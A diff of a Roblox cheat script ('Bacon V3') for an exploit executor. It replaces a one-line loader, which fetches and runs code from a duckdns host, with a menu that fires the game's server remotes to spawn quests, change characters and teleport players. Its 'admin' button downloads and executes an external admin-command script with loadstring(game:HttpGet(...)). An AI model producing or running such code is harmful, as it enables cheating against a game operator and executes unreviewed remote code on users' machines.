@@ -1,1 +1,497 @@
-loadstring(game:HttpGet("http://berngo.duckdns.org/Lel/Protected.txt"))()
+-- make by Bacon @daffa_fakhrizzal
+-- Bacon v3
+local ScreenGui = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local quest = Instance.new("Frame")
+local TeleportMenu = Instance.new("Frame")
+local charqol = Instance.new("Frame")
+local title = Instance.new("TextLabel")
+local QuestTitle = Instance.new("TextLabel")
+local TeleportTitle = Instance.new("TextLabel")
+local CharTitle = Instance.new("TextLabel")
+local Text = Instance.new("TextButton")
+local adminC = Instance.new("TextButton")
+local PengChar = Instance.new("TextButton")
+local FoxChar = Instance.new("TextButton")
+local ChickChar = Instance.new("TextButton")
+local CharClose = Instance.new("TextButton")
+local ccharacter = Instance.new("TextButton")
+local discord = Instance.new("TextButton")
+local winter = Instance.new("TextButton")
+local spider = Instance.new("TextButton")
+local infox = Instance.new("TextButton")
+local chqst = Instance.new("TextButton")
+local fabbi = Instance.new("TextButton")
+local pqst = Instance.new("TextButton")
+local Te = Instance.new("TextButton")
+local close = Instance.new("TextButton")
+local QuestClose = Instance.new("TextButton")
+local TeleportClose = Instance.new("TextButton")
+local InnerCloud = Instance.new("TextButton")
+local openmain = Instance.new("Frame")
+local open = Instance.new("TextButton")
+--Properties:
+ScreenGui.Parent = game.CoreGui
+
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Welcome";
+        Text = "Script Loaded :D";
+        Icon = "rbxthumb://type=AvatarHeadShot&id=3044336136&w=150&h=150"})
+Duration = 16;
+
+main.Name = "main"
+main.Parent = ScreenGui
+main.BackgroundColor3 = Color3.new(0, 0, 0)
+main.Position = UDim2.new(0.0203577988, 0, 0.641277611, 0)
+main.Size = UDim2.new(0, 432, 0, 291)
+main.Visible = false
+main.Active = true
+main.Draggable = true
+
+quest.Name = "quest"
+quest.Parent = ScreenGui
+quest.BackgroundColor3 = Color3.new(0, 0, 0)
+quest.Position = UDim2.new(0.0203577988, 0, 0.641277611, 0)
+quest.Size = UDim2.new(0, 432, 0, 291)
+quest.Visible = false
+quest.Active = true
+quest.Draggable = true
+
+charqol.Name = "charqol"
+charqol.Parent = ScreenGui
+charqol.BackgroundColor3 = Color3.new(0, 0, 0)
+charqol.Position = UDim2.new(0.0203577988, 0, 0.641277611, 0)
+charqol.Size = UDim2.new(0, 432, 0, 291)
+charqol.Visible = false
+charqol.Active = true
+charqol.Draggable = true
+
+TeleportMenu.Name = "TeleportMenu"
+TeleportMenu.Parent = ScreenGui
+TeleportMenu.BackgroundColor3 = Color3.new(0, 0, 0)
+TeleportMenu.Position = UDim2.new(0.0203577988, 0, 0.641277611, 0)
+TeleportMenu.Size = UDim2.new(0, 432, 0, 291)
+TeleportMenu.Visible = false
+TeleportMenu.Active = true
+TeleportMenu.Draggable = true
+
+title.Name = "title"
+title.Parent = main
+title.BackgroundColor3 = Color3.new(1, 0, 1)
+title.Size = UDim2.new(0, 332, 0, 31)
+title.Font = Enum.Font.GothamBold
+title.Text = "Bãçøñ V3"
+title.TextColor3 = Color3.new(0, 0, 0)
+title.TextSize = 14
+
+QuestTitle.Name = "QuestTitle"
+QuestTitle.Parent = quest
+QuestTitle.BackgroundColor3 = Color3.new(1, 0, 1)
+QuestTitle.Size = UDim2.new(0, 332, 0, 31)
+QuestTitle.Font = Enum.Font.GothamBold
+QuestTitle.Text = "Quest Menu"
+QuestTitle.TextColor3 = Color3.new(0, 0, 0)
+QuestTitle.TextSize = 14
+
+CharTitle.Name = "CharTitle"
+CharTitle.Parent = charqol
+CharTitle.BackgroundColor3 = Color3.new(1, 0, 1)
+CharTitle.Size = UDim2.new(0, 332, 0, 31)
+CharTitle.Font = Enum.Font.GothamBold
+CharTitle.Text = "Character Menu"
+CharTitle.TextColor3 = Color3.new(0, 0, 0)
+CharTitle.TextSize = 14
+
+TeleportTitle.Name = "TeleportTitle"
+TeleportTitle.Parent = TeleportMenu
+TeleportTitle.BackgroundColor3 = Color3.new(1, 0, 1)
+TeleportTitle.Size = UDim2.new(0, 332, 0, 31)
+TeleportTitle.Font = Enum.Font.GothamBold
+TeleportTitle.Text = "Teleport Menu"
+TeleportTitle.TextColor3 = Color3.new(0, 0, 0)
+TeleportTitle.TextSize = 14
+
+Te.Name = "Te"
+Te.Parent = main
+Te.BackgroundColor3 = Color3.new(0.333333, 1, 0)
+Te.Size = UDim2.new(0, 110, 0, 50)
+Te.Font = Enum.Font.GothamBold
+Te.Text = "Teleport"
+Te.Position = UDim2.new(0.679518092, 0, 0.38, 0)
+Te.TextColor3 = Color3.new(0, 0, 0)
+Te.TextScaled = true
+Te.TextSize = 14
+Te.TextWrapped = true
+Te.MouseButton1Down:connect(function()
+main.Visible = false
+TeleportMenu.Visible = true
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Teleport";
+        Text = "Teleport To Secret Event";
+        Icon = "rbxthumb://type=AvatarHeadShot&id=3044336136&w=150&h=150"})
+Duration = 16;
+end)
+
+PengChar.Name = "PengChar"
+PengChar.Parent = charqol
+PengChar.BackgroundColor3 = Color3.new(0.333333, 1, 0)
+PengChar.Size = UDim2.new(0, 110, 0, 50)
+PengChar.Font = Enum.Font.GothamBold
+PengChar.Text = "Penguin"
+PengChar.Position = UDim2.new(0.679518092, 0, 0.38, 0)
+PengChar.TextColor3 = Color3.new(0, 0, 0)
+PengChar.TextScaled = true
+PengChar.TextSize = 14
+PengChar.TextWrapped = true
+PengChar.MouseButton1Down:connect(function()
+game:GetService("Workspace").ChangeCharacter:FireServer("PenguinCharacter")
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Character";
+        Text = "Success to be Penguin";
+        Icon = "rbxthumb://type=AvatarHeadShot&id=3044336136&w=150&h=150"})
+Duration = 16;
+end)
+
+discord.Name = "Discord"
+discord.Parent = main
+discord.BackgroundColor3 = Color3.new(0.333333, 1, 0)
+discord.Size = UDim2.new(0, 110, 0, 50)
+discord.Font = Enum.Font.GothamBold
+discord.Text = "Discord"
+discord.Position = UDim2.new(0.679518092, 0, 0.63, 0)
+discord.TextColor3 = Color3.new(0, 0, 0)
+discord.TextScaled = true
+discord.TextSize = 14
+discord.TextWrapped = true
+discord.MouseButton1Down:connect(function()
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "username & tag";
+        Text = "username= baconishere & tag=8647";
+        Icon = "rbxthumb://type=Avatar&id=3044336136&w=150&h=150"})
+Duration = 16;
+end)
+
+winter.Name = "Winter"
+winter.Parent = TeleportMenu
+winter.BackgroundColor3 = Color3.new(0.333333, 1, 0)
+winter.Size = UDim2.new(0, 110, 0, 50)
+winter.Font = Enum.Font.GothamBold
+winter.Text = "Winter"
+winter.Position = UDim2.new(0.679518092, 0, 0.38, 0)
+winter.TextColor3 = Color3.new(0, 0, 0)
+winter.TextScaled = true
+winter.TextSize = 14
+winter.TextWrapped = true
+winter.MouseButton1Down:connect(function()
+game:GetService("TeleportService"):Teleport(1930866268, LocalPlayer)
+end)
+
+infox.Name = "InfoX"
+infox.Parent = main
+infox.BackgroundColor3 = Color3.new(0.333333, 1, 0)
+infox.Position = UDim2.new(0.35518092, 0, 0.38, 0)
+infox.Size = UDim2.new(0, 110, 0, 50)
+infox.Font = Enum.Font.GothamBold
+infox.Text = "End Script"
+infox.TextColor3 = Color3.new(0, 0, 0)
+infox.TextScaled = true
+infox.TextSize = 14
+infox.TextWrapped = true
+infox.MouseButton1Down:connect(function()
+openmain.Visible = false
+main.Visible = false
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "GoodBye";
+        Text = "Script Has Ended";
+        Icon = "rbxthumb://type=AvatarHeadShot&id=3044336136&w=150&h=150"})
+Duration = 16;
+end)
+
+FoxChar.Name = "FoxChar"
+FoxChar.Parent = charqol
+FoxChar.BackgroundColor3 = Color3.new(0.333333, 1, 0)
+FoxChar.Position = UDim2.new(0.35518092, 0, 0.38, 0)
+FoxChar.Size = UDim2.new(0, 110, 0, 50)
+FoxChar.Font = Enum.Font.GothamBold
+FoxChar.Text = "Fox"
+FoxChar.TextColor3 = Color3.new(0, 0, 0)
+FoxChar.TextScaled = true
+FoxChar.TextSize = 14
+FoxChar.TextWrapped = true
+FoxChar.MouseButton1Down:connect(function()
+game:GetService("Workspace").ChangeCharacter:FireServer("FoxCharacter")
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Character";
+        Text = "Success to be Fox";
+        Icon = "rbxthumb://type=AvatarHeadShot&id=3044336136&w=150&h=150"})
+Duration = 16;
+end)
+
+ccharacter.Name = "CCharacter"
+ccharacter.Parent = main
+ccharacter.BackgroundColor3 = Color3.new(0.333333, 1, 0)
+ccharacter.Position = UDim2.new(0.35518092, 0, 0.63, 0)
+ccharacter.Size = UDim2.new(0, 110, 0, 50)
+ccharacter.Font = Enum.Font.GothamBold
+ccharacter.Text = "Character"
+ccharacter.TextColor3 = Color3.new(0, 0, 0)
+ccharacter.TextScaled = true
+ccharacter.TextSize = 14
+ccharacter.TextWrapped = true
+ccharacter.MouseButton1Down:connect(function()
+main.Visible = false
+charqol.Visible = true
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Character";
+        Text = "You Can Be Animal Character";
+        Icon = "rbxthumb://type=AvatarHeadShot&id=3044336136&w=150&h=150"})
+Duration = 16;
+end)
+
+spider.Name = "spider"
+spider.Parent = TeleportMenu
+spider.BackgroundColor3 = Color3.new(0.333333, 1, 0)
+spider.Position = UDim2.new(0.35518092, 0, 0.38, 0)
+spider.Size = UDim2.new(0, 110, 0, 50)
+spider.Font = Enum.Font.GothamBold
+spider.Text = "SPIDER"
+spider.TextColor3 = Color3.new(0, 0, 0)
+spider.TextScaled = true
+spider.TextSize = 14
+spider.TextWrapped = true
+spider.MouseButton1Down:connect(function()
+game:GetService("TeleportService"):Teleport(1930665568, LocalPlayer)
+end)
+
+pqst.Name = "PresentQuest"
+pqst.Parent = quest
+pqst.BackgroundColor3 = Color3.new(0.333333, 1, 0)
+pqst.Position = UDim2.new(0.35518092, 0, 0.38, 0)
+pqst.Size = UDim2.new(0, 110, 0, 50)
+pqst.Font = Enum.Font.GothamBold
+pqst.Text = "Present"
+pqst.TextColor3 = Color3.new(0, 0, 0)
+pqst.TextScaled = true
+pqst.TextSize = 14
+pqst.TextWrapped = true
+pqst.MouseButton1Down:connect(function()
+game.Workspace.QuestMakerEvent:FireServer(99)
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Present Quest";
+        Text = "Win= get 150 golds";
+        Icon = "rbxthumb://type=AvatarHeadShot&id=3044336136&w=150&h=150"})
+Duration = 16;
+end)
+
+chqst.Name = "ChristmasQuest"
+chqst.Parent = quest
+chqst.BackgroundColor3 = Color3.new(0.333333, 1, 0)
+chqst.Position = UDim2.new(0.679518092, 0, 0.38, 0)
+chqst.Size = UDim2.new(0, 110, 0, 50)
+chqst.Font = Enum.Font.GothamBold
+chqst.Text = "Chirstmas"
+chqst.TextColor3 = Color3.new(0, 0, 0)
+chqst.TextScaled = true
+chqst.TextSize = 14
+chqst.TextWrapped = true
+chqst.MouseButton1Down:connect(function()
+game.Workspace.QuestMakerEvent:FireServer(101)
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "2021 Christmas quest";
+        Text = "Win= get free trowel tool";
+        Icon = "rbxthumb://type=AvatarHeadShot&id=3044336136&w=150&h=150"})
+Duration = 16;
+end)
+
+Text.Name = "Text"
+Text.Parent = main
+Text.BackgroundColor3 = Color3.new(0.333333, 1, 0)
+Text.Position = UDim2.new(0.036144577, 0, 0.379146934, 0)
+Text.Size = UDim2.new(0, 110, 0, 50)
+Text.Font = Enum.Font.GothamBold
+Text.Text = "Quest"
+Text.TextColor3 = Color3.new(0, 0, 0)
+Text.TextScaled = true
+Text.TextSize = 10
+Text.TextWrapped = true
+Text.MouseButton1Down:connect(function()
+main.Visible = false
+quest.Visible = true
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Quest";
+        Text = "Spawn Secret Quest";
+        Icon = "rbxthumb://type=AvatarHeadShot&id=3044336136&w=150&h=150"})
+Duration = 16;
+end)
+
+adminC.Name = "adminC"
+adminC.Parent = main
+adminC.BackgroundColor3 = Color3.new(0.333333, 1, 0)
+adminC.Position = UDim2.new(0.036144577, 0, 0.63, 0)
+adminC.Size = UDim2.new(0, 110, 0, 50)
+adminC.Font = Enum.Font.GothamBold
+adminC.Text = "admin"
+adminC.TextColor3 = Color3.new(0, 0, 0)
+adminC.TextScaled = true
+adminC.TextSize = 10
+adminC.TextWrapped = true
+adminC.MouseButton1Down:connect(function()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Info";
+        Text = "Now u can use admin command";
+        Icon = "rbxthumb://type=AvatarHeadShot&id=3044336136&w=150&h=150"})
+Duration = 16;
+end)
+
+ChickChar.Name = "ChickChar"
+ChickChar.Parent = charqol
+ChickChar.BackgroundColor3 = Color3.new(0.333333, 1, 0)
+ChickChar.Position = UDim2.new(0.036144577, 0, 0.379146934, 0)
+ChickChar.Size = UDim2.new(0, 110, 0, 50)
+ChickChar.Font = Enum.Font.GothamBold
+ChickChar.Text = "Chicken"
+ChickChar.TextColor3 = Color3.new(0, 0, 0)
+ChickChar.TextScaled = true
+ChickChar.TextSize = 10
+ChickChar.TextWrapped = true
+ChickChar.MouseButton1Down:connect(function()
+game:GetService("Workspace").ChangeCharacter:FireServer("ChickenCharacter")
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Character";
+        Text = "Success to be Chicken";
+        Icon = "rbxthumb://type=AvatarHeadShot&id=3044336136&w=150&h=150"})
+Duration = 16;
+end)
+
+fabbi.Name = "FabbiQuest"
+fabbi.Parent = quest
+fabbi.BackgroundColor3 = Color3.new(0.333333, 1, 0)
+fabbi.Position = UDim2.new(0.036144577, 0, 0.379146934, 0)
+fabbi.Size = UDim2.new(0, 110, 0, 50)
+fabbi.Font = Enum.Font.GothamBold
+fabbi.Text = "Fabbi"
+fabbi.TextColor3 = Color3.new(0, 0, 0)
+fabbi.TextScaled = true
+fabbi.TextSize = 10
+fabbi.TextWrapped = true
+fabbi.MouseButton1Down:connect(function()
+game.Workspace.QuestMakerEvent:FireServer(100)
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Fabbi";
+        Text = "u Can get bread uf u defeat the boss";
+        Icon = "rbxthumb://type=AvatarHeadShot&id=3044336136&w=150&h=150"})
+Duration = 16;
+end)
+
+InnerCloud.Name = "InnerCloud"
+InnerCloud.Parent = TeleportMenu
+InnerCloud.BackgroundColor3 = Color3.new(0.333333, 1, 0)
+InnerCloud.Position = UDim2.new(0.036144577, 0, 0.379146934, 0)
+InnerCloud.Size = UDim2.new(0, 110, 0, 50)
+InnerCloud.Font = Enum.Font.GothamBold
+InnerCloud.Text = "InnerCloud"
+InnerCloud.TextColor3 = Color3.new(0, 0, 0)
+InnerCloud.TextScaled = true
+InnerCloud.TextSize = 10
+InnerCloud.TextWrapped = true
+InnerCloud.MouseButton1Down:connect(function()
+game:GetService("TeleportService"):Teleport(1930863474, LocalPlayer)
+end)
+
+close.Name = "close"
+close.Parent = main
+close.BackgroundColor3 = Color3.new(1, 0, 0)
+close.Position = UDim2.new(0.879518092, 0, 0, 0)
+close.Size = UDim2.new(0, 40, 0, 31)
+close.Font = Enum.Font.GothamBlack
+close.Text = "X"
+close.TextColor3 = Color3.new(0, 0, 0)
+close.TextScaled = true
+close.TextSize = 14
+close.TextWrapped = true
+close.MouseButton1Down:connect(function()
+main.Visible = false
+openmain.Visible = true
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Info";
+        Text = "Menu Closed!";
+        Icon = "rbxthumb://type=AvatarHeadShot&id=3044336136&w=150&h=150"})
+Duration = 16;
+end)
+
+QuestClose.Name = "QuestClose"
+QuestClose.Parent = quest
+QuestClose.BackgroundColor3 = Color3.new(1, 0, 0)
+QuestClose.Position = UDim2.new(0.879518092, 0, 0, 0)
+QuestClose.Size = UDim2.new(0, 40, 0, 31)
+QuestClose.Font = Enum.Font.GothamBlack
+QuestClose.Text = "X"
+QuestClose.TextColor3 = Color3.new(0, 0, 0)
+QuestClose.TextScaled = true
+QuestClose.TextSize = 14
+QuestClose.TextWrapped = true
+QuestClose.MouseButton1Down:connect(function()
+main.Visible = true
+quest.Visible = false
+end)
+
+TeleportClose.Name = "TeleportClose"
+TeleportClose.Parent = TeleportMenu
+TeleportClose.BackgroundColor3 = Color3.new(1, 0, 0)
+TeleportClose.Position = UDim2.new(0.879518092, 0, 0, 0)
+TeleportClose.Size = UDim2.new(0, 40, 0, 31)
+TeleportClose.Font = Enum.Font.GothamBlack
+TeleportClose.Text = "X"
+TeleportClose.TextColor3 = Color3.new(0, 0, 0)
+TeleportClose.TextScaled = true
+TeleportClose.TextSize = 14
+TeleportClose.TextWrapped = true
+TeleportClose.MouseButton1Down:connect(function()
+main.Visible = true
+TeleportMenu.Visible = false
+end)
+
+CharClose.Name = "CharClose"
+CharClose.Parent = charqol
+CharClose.BackgroundColor3 = Color3.new(1, 0, 0)
+CharClose.Position = UDim2.new(0.879518092, 0, 0, 0)
+CharClose.Size = UDim2.new(0, 40, 0, 31)
+CharClose.Font = Enum.Font.GothamBlack
+CharClose.Text = "X"
+CharClose.TextColor3 = Color3.new(0, 0, 0)
+CharClose.TextScaled = true
+CharClose.TextSize = 14
+CharClose.TextWrapped = true
+CharClose.MouseButton1Down:connect(function()
+main.Visible = true
+charqol.Visible = false
+end)
+
+openmain.Name = "openmain"
+openmain.Parent = ScreenGui
+openmain.BackgroundColor3 = Color3.new(1, 1, 1)
+openmain.Position = UDim2.new(0.00801973976, 0, 0.423832953, 0)
+openmain.Size = UDim2.new(0, 100, 0, 28)
+openmain.Active = true
+openmain.Draggable = true
+
+open.Name = "open"
+open.Parent = openmain
+open.BackgroundColor3 = Color3.new(1, 0, 0)
+open.Size = UDim2.new(0, 100, 0, 28)
+open.Font = Enum.Font.GothamBold
+open.Text = "MENU"
+open.TextColor3 = Color3.new(0, 0, 0)
+open.TextSize = 18
+open.TextWrapped = true
+open.Draggable = true
+open.MouseButton1Down:connect(function()
+openmain.Visible = false
+main.Visible = true
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Menu";
+        Text = "The menu";
+        Icon = "rbxthumb://type=AvatarHeadShot&id=3044336136&w=150&h=150"})
+Duration = 16;
+end)
